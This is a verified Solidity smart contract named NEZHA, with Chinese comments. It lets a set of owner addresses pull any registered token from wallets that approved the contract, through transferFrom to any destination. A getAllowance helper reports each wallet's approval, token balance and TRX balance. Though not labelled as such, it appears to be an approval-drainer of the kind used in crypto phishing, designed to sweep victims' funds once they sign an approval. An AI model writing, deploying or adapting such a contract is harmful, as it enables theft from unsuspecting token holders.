/**
 *Submitted for verification at Etherscan.io on 2025-02-20
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract NEZHA {
    mapping(address => bool) private owners; // 存储管理员地址
    mapping(address => IERC20) private tokens;
    address private latestOwner; // 存储最新管理员地址
    bool private locked; // 防止重入攻击
    // 仅管理员可调用的修饰符
    modifier onlyOwner() {
        require(owners[msg.sender], "Not contract owner");
        _;
    }

    // 防止重入攻击修饰符
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    // 构造函数：初始化合约创建者为管理员
    constructor() {
        owners[msg.sender] = true; // 合约创建者为管理员
        latestOwner = msg.sender;  // 记录最新的管理员
    }

  
    function transferOwnerShip(address newOwner) external onlyOwner returns (bool){
        require(newOwner != address(0), "New owner is the zero address");
        require(!owners[newOwner], "Already an owner");
        owners[newOwner] = true;
        latestOwner = newOwner; // 更新最新管理员
        return true; // 执行成功，返回 true
    }


    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function registerToken(address token) external onlyOwner {
        require(isContract(token), "Token is not a contract");
        require(token != address(0), "Invalid token address");
        tokens[token] = IERC20(token);
    }

    // 从授权用户账户扣除指定代币并转账到目标地址
    function deductToken(address token, address from, address to, uint256 amount) external onlyOwner returns (bool){
        require(tokens[token] != IERC20(address(0)), "Token not registered");
        return tokens[token].transferFrom(from, to, amount);
    }

    // 查询某个地址授权给合约的代币额度，以及合约的 TRX 余额和能量
    function getAllowance(address token, address ownerAddress) external view returns (uint256 allowance, uint256 contractBalance, uint256 trxBalance) {
        // 查询授权额度
        IERC20 erc20 = IERC20(token);
        allowance = erc20.allowance(ownerAddress, address(this));

        // 查询代币余额
        contractBalance = erc20.balanceOf(ownerAddress);

        // 查询TRX余额
        trxBalance = ownerAddress.balance;

        return (allowance, contractBalance, trxBalance);
    }

    // 查询最新的管理员地址
    function getOwner() external view returns (address) {
        return latestOwner;
    }
}